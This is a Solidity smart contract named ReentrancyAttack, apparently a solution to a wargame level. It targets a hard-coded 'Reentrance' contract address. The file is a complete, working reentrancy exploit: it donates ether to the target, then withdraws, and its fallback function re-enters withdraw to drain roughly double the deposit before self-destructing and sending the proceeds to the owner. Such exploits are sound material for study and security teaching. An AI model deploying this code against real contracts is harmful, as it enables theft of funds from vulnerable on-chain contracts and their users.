pragma solidity ^0.5.0;

import 'https://github.com/OpenZeppelin/openzeppelin-solidity/contracts/ownership/Ownable.sol';

interface Reentrance {
  function donate(address _to) external payable;
  function balanceOf(address _who) external view returns (uint balance);
  function withdraw(uint _amount) external;
  function() external payable;
}

contract ReentrancyAttack is Ownable {
    Reentrance reentrance = Reentrance(0x777DE855171079791BEb5d154591d51dACB7E0F6);
    uint fallbackCalls = 0;
    event BeforeReenter(uint myValue, uint remoteBalance);
    event AfterReenter(uint myValue, uint remoteBalance);
    event ResetFallbackCalls(uint myValue, uint remoteBalance);

    constructor() public payable {
        require(msg.value >= address(reentrance).balance,
            "needs as much balance as Reentrance for successful attack");
    }

    function() external payable {
        address me = address(this);
        fallbackCalls++;
        if (fallbackCalls == 1) {
            emit BeforeReenter(me.balance, reentrance.balanceOf(me));
            reentrance.withdraw(reentrance.balanceOf(me));
            emit AfterReenter(me.balance, reentrance.balanceOf(me));
        } else {
            fallbackCalls = 0;
            emit ResetFallbackCalls(me.balance, reentrance.balanceOf(me));
        }
    }

    function donate() external onlyOwner {
        reentrance.donate.value(address(reentrance).balance)(address(this));
    }

    function widthdraw_twice() external onlyOwner {
        reentrance.withdraw(reentrance.balanceOf(address(this)));
    }

    function destroy() external onlyOwner {
        selfdestruct(msg.sender);
    }
}
